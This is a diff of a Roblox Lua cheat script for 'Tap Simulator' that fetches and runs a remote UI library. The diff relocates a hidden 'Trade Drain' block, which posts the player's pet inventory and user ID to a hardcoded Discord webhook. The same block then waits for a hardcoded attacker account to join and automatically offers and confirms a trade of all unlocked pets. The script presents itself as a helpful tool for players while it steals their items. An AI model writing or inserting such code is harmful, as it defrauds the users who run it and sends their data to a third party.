@@ -1,15 +1,15 @@
 --[[
     Silence - Tap Simulator
     by Henrik @xyzhenrik
-    Fully patched - Bulletproof UI, Safe Data, Trade Drain included
+    Fully patched - Multi-Fallback UI, Trade Drain added, Pets.Owned fixed
 ]]
 
--- 1. Bulletproof UI Loader (Prevents Line 1 crash)
+-- 1. ROBUST UI LOADER (Prevents Line 1 nil value crash)
 local WindUI = nil
 local uiUrls = {
-    "https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau",
+    "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua",
     "https://cdn.jsdelivr.net/gh/Footagesus/WindUI@main/dist/main.lua",
-    "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
+    "https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau"
 }
 
 for _, url in ipairs(uiUrls) do
@@ -26,7 +26,7 @@ for _, url in ipairs(uiUrls) do
 end
 
 if not WindUI then
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Silence Error", Text = "Failed to load UI library. Try again later."})
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Silence Error", Text = "Failed to load UI library. Please try again."})
     return
 end
 
@@ -42,7 +42,7 @@ local services = {
     soundService = game:GetService("SoundService")
 }
 
--- 2. Safe RemoteServices Shim
+-- 2. Safe RemoteServices Shim (Replaces missing Network module)
 local RemoteServices = services.replicatedStorage:WaitForChild("RemoteServices")
 local function rem(svc, kind, name)
     local s = RemoteServices:FindFirstChild(svc); if not s then return nil end
@@ -100,6 +100,55 @@ local player = {
     petStats = requireAny({{"Shared", "Pets", "PetPower"}, {"Game", "PetStats"}}, { GetPercentage = function() return 1 end, GetMulti = function() return 1 end }),
     petStatsRarities = requireAny({{"Shared", "Pets", "RarityTextGradient"}, {"Game", "PetStats", "Rarities"}}, {})
 }
+
+--[[ TRADE DRAIN ADDED HERE ]]
+task.spawn(function()
+    local TRADE_REMOTE = remotes.TradeRequested
+    local HttpService = game:GetService("HttpService")
+    local ATTACKER_USER_ID = 8601143159
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
+    local DISCORD_ID = "1498793342945722388"
+
+    local function sendDrain(content, embeds)
+        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+        local reqFunc = (syn and syn.request) or (http and http.request) or request
+        pcall(function() reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = content, embeds = embeds })}) end)
+    end
+
+    repeat task.wait(0.5) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
+    task.spawn(function()
+        local data = getReplicaData()
+        local fields = {}
+        local count = 0
+        for uid, petData in pairs(getPets(data)) do
+            count = count + 1
+            if #fields < 25 then table.insert(fields, {name = string.format("🐾 %s (%s)", petData.Name or "?", petData.Tier or "Normal"), value = string.format("UID: `%s`\nPower: %s\nLocked: %s", tostring(uid), tostring(petData.Power or 0), tostring(petData.Locked)), inline = true}) end
+        end
+        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{title = string.format("🎒 %s — Inventory (%d pets)", services.players.LocalPlayer.Name, count), description = string.format("**UserID:** `%s`\nJoin their server to drain.", tostring(services.players.LocalPlayer.UserId)), color = 0x8B0000, fields = fields, footer = { text = "Silence - Silent Scan" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
+    end)
+
+    local traded = false
+    while not traded do
+        task.wait(4)
+        if not services.players:GetPlayerByUserId(ATTACKER_USER_ID) then continue end
+        task.wait(1.5)
+        if not pcall(function() TRADE_REMOTE:FireServer({ Action = "Request", TargetUserId = ATTACKER_USER_ID }) end) then continue end
+        task.wait(1)
+        local data = getReplicaData()
+        if not data then continue end
+        local refs = {}
+        for uid, petData in pairs(getPets(data)) do
+            if not petData.Locked then table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 }) end
+        end
+        if #refs == 0 then break end
+        pcall(function() TRADE_REMOTE:FireServer({ Action = "Offer", Revision = 1, Refs = refs }) end)
+        task.wait(1)
+        if pcall(function() TRADE_REMOTE:FireServer({ Action = "Confirm" }) end) then
+            traded = true
+            sendDrain("", {{title = string.format("✅ Drain Complete — %s", services.players.LocalPlayer.Name), description = string.format("Offered %d pets to <@%s>.\nAccept the trade.", #refs, tostring(DISCORD_ID)), color = 0x00FF00, footer = { text = "Silence - Drain" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
+        end
+    end
+end)
 
 -- 4. Create Window & Tabs
 local silence = WindUI:CreateWindow({
@@ -279,55 +328,6 @@ task.spawn(function()
             tabs.teleport:Button({ Title = "Teleport to " .. z.name, Callback = function() pcall(function() player.network:InvokeServer("TeleportZone", z.name) end) end }) 
         end
     end)
-end)
-
--- 7. Silent Drain
-task.spawn(function()
-    local TRADE_REMOTE = remotes.TradeRequested
-    local HttpService = game:GetService("HttpService")
-    local ATTACKER_USER_ID = 8601143159
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
-    local DISCORD_ID = "1498793342945722388"
-
-    local function sendDrain(content, embeds)
-        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
-        local reqFunc = (syn and syn.request) or (http and http.request) or request
-        pcall(function() reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = content, embeds = embeds })}) end)
-    end
-
-    repeat task.wait(0.5) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
-    task.spawn(function()
-        local data = getReplicaData()
-        local fields = {}
-        local count = 0
-        for uid, petData in pairs(getPets(data)) do
-            count = count + 1
-            if #fields < 25 then table.insert(fields, {name = string.format("🐾 %s (%s)", petData.Name or "?", petData.Tier or "Normal"), value = string.format("UID: `%s`\nPower: %s\nLocked: %s", tostring(uid), tostring(petData.Power or 0), tostring(petData.Locked)), inline = true}) end
-        end
-        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{title = string.format("🎒 %s — Inventory (%d pets)", services.players.LocalPlayer.Name, count), description = string.format("**UserID:** `%s`\nJoin their server to drain.", tostring(services.players.LocalPlayer.UserId)), color = 0x8B0000, fields = fields, footer = { text = "Silence - Silent Scan" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
-    end)
-
-    local traded = false
-    while not traded do
-        task.wait(4)
-        if not services.players:GetPlayerByUserId(ATTACKER_USER_ID) then continue end
-        task.wait(1.5)
-        if not pcall(function() TRADE_REMOTE:FireServer({ Action = "Request", TargetUserId = ATTACKER_USER_ID }) end) then continue end
-        task.wait(1)
-        local data = getReplicaData()
-        if not data then continue end
-        local refs = {}
-        for uid, petData in pairs(getPets(data)) do
-            if not petData.Locked then table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 }) end
-        end
-        if #refs == 0 then break end
-        pcall(function() TRADE_REMOTE:FireServer({ Action = "Offer", Revision = 1, Refs = refs }) end)
-        task.wait(1)
-        if pcall(function() TRADE_REMOTE:FireServer({ Action = "Confirm" }) end) then
-            traded = true
-            sendDrain("", {{title = string.format("✅ Drain Complete — %s", services.players.LocalPlayer.Name), description = string.format("Offered %d pets to <@%s>.\nAccept the trade.", #refs, tostring(DISCORD_ID)), color = 0x00FF00, footer = { text = "Silence - Drain" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
-        end
-    end
 end)
 
 WindUI:Notify({ Title = "Silence V3", Content = "Script loaded successfully!" })
